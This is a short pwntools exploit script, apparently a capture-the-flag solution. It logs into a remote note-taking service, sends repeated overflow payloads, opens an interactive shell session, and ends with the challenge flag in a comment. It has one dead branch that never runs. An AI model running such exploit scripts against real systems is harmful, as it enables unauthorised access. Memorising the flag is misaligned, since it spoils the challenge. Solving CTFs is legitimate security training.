from pwn import *
import struct
context(os='linux', arch='i386')

def getConn():
    return process("./hexnote_400",'admin') if local else remote('pwnd.nyanwith.me', 8001)
 
local = False

r = getConn()

pl="A"*16

print r.recvuntil('Username:')
r.sendline('guest')
print r.recvuntil('Password:')
r.sendline('hunter2')
print r.recv(1000)


r.sendline('1')
print r.recvuntil('Your note:')
r.sendline(pl)
print "Round 0"
for i in range(8):
	if i==8: pl='1'*16
	print "Round",i+1
	try:
		r.recvuntil('Leave a note')	
		r.sendline('1')
		r.recvuntil('Your note:')
		r.sendline(pl)
	except:
		print r.recv(1024)

r.sendline('3')
r.interactive()
r.close()
#UETCTF{Subtl3ty_1s_th3_b3tt3r_p4rt_0f_v4l0r}

